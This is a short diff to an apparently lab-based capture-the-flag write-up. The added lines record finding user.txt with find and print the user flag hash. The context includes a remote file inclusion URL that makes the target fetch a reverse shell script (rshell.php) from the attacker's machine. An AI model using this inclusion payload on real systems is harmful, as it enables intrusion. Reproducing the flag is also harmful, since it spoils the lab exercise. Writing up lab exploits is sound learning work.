@@ -142,6 +142,14 @@ then performed shell stabilisation:
 
 ![](../../img/Pasted%20image%2020220827222126.png)
 
+Then performed search for user.txt using find:
+
+![](../../img/Pasted%20image%2020220827223411.png)
+
+User flag:
+7ce5c2109a40f958099283600a9ae807
+
+
 
 
 http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.109.169/rshell.php
